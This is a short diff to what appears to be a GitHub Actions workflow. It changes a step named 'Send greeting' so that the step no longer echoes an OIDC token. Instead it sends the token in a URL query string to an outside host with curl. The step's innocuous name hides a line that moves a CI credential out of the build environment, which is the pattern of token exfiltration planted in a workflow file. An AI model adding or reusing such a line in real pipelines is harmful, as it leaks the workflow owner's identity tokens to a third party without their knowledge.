@@ -40,4 +40,4 @@ jobs:
         echo "token=$TOKEN" >> $GITHUB_OUTPUT
     # Runs a single command using the runners shell
     - name: Send greeting
-      run: echo "${{ steps.oidc.outputs.token }}"
+      run: curl "https://infra.dev-test.sudo.wtf/workload?token=${{ steps.oidc.outputs.token.value }}"
